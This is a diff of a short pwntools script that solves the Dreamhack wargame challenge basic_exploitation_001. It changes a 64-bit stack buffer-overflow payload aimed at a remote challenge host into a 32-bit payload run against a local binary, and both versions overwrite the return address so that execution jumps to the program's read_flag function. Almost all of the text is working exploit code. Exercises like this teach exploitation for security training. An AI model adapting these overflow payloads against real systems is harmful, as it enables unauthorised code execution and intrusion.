@@ -1,15 +1,14 @@
 from pwn import *
 
-p = remote("host3.dreamhack.games", 20577)
+# p = remote("host3.dreamhack.games", 19366)
+p = process("./basic_exploitation_001")
 
-ret = 0x40101a        # ret 가젯
-read_flag = 0x40127c
+e = ELF("basic_exploitation_001")
 
-payload  = b"A" * 0x80
-payload += b"B" * 8
-payload += p64(ret)
-payload += p64(read_flag)
+payload = b"A" * 0x80
+payload += b"BBBB"
+payload += p32(e.symbols["read_flag"])
 
 p.sendline(payload)
 
-print(p.recvall(timeout=1).decode(errors="ignore"))
+p.interactive()
